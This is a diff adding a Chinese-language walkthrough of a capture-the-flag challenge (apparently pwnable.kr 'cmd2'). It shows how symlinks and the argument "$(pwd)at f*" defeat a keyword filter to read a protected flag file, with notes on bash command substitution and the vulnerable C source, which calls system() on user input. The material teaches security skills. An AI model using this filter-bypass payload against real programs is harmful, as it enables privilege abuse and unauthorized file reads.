@@ -1,0 +1,52 @@
+最后发现pwd命令可以直接产生/字符，因此可以构造出如下的使用方法。
+首先在/tmp目录下建立自己的目录exploit，然后创建目录/tmp/exploit/c。
+那么，如果在/tmp/exploit/c目录下执行pwd命令就可以得到/tmp/exploit/c了。
+然后在/tmp/exploit下构造cat的软应用ln -s /bin/cat cat，在/tmp/exploit/c下建立flag的软引用ln -s /home/cmd2/flag flag。
+然后在/tmp/exploit/c下执行命令/home/cmd2/cmd2 "\$(pwd)at f*"就可以得到flag了。
+其原理就是利用“$(pwd)at”构造出/tmp/exploit/cat命令。
+
+
+
+
+"\$(pwd)at f*"中
+\转义符号
+$(pwd)是将执行结果作为变量的方法
+
+注意下 `` 也被过滤了，所以
+命令替换
+在bash中，$( )与` `（反引号）都是用来作命令替换的。
+命令替换与变量替换差不多，都是用来重组命令行的，先完成引号里的命令行，然后将其结果替换出来，再重组成新的命令行。
+并不算是命令替换有什么区别，
+只是这里被过滤而已
+两种都行
+
+
+#include <stdio.h>  
+#include <string.h>  
+  
+int filter(char* cmd){  
+    int r=0;  
+    r += strstr(cmd, "=")!=0;  
+    r += strstr(cmd, "PATH")!=0;  
+    r += strstr(cmd, "export")!=0;  
+    r += strstr(cmd, "/")!=0;  
+    r += strstr(cmd, "`")!=0;  
+    r += strstr(cmd, "flag")!=0;  
+    return r;  
+}  
+  
+extern char** environ;  
+void delete_env(){  
+    char** p;  
+    for(p=environ; *p; p++) memset(*p, 0, strlen(*p));  
+}  
+  
+int main(int argc, char* argv[], char** envp){  
+    delete_env();  
+    putenv("PATH=/no_command_execution_until_you_become_a_hacker");  
+    if(filter(argv[1])) return 0;  
+    printf("%s\n", argv[1]);  
+    system( argv[1] );  
+    return 0;  
+
+
